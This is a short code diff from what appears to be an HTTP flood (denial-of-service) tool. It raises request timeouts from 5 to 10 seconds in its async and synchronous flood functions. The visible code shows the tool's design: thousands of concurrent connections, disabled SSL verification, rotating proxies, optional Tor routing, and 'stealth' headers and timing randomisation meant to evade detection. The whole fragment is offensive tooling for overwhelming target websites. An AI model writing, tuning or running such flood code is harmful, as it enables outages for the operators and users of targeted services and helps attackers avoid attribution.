@@ -16,7 +16,7 @@ from src.utils.logging import add_system_log
 async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
     """Extreme performance asynchronous HTTP flood with persistent workers"""
     connector = aiohttp.TCPConnector(limit=2000, ssl=False, force_close=True)
-    timeout = aiohttp.ClientTimeout(total=5)
+    timeout = aiohttp.ClientTimeout(total=10)
     end_time = time.time() + duration
 
     async def worker(session):
@@ -63,7 +63,7 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_to
                     proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
                 
                 headers = stealth_headers if stealth_mode else get_random_headers()
-                response = session.get(url, headers=headers, proxies=proxy, timeout=5)
+                response = session.get(url, headers=headers, proxies=proxy, timeout=10)
                 
                 if stealth_mode:
                     randomize_timing()
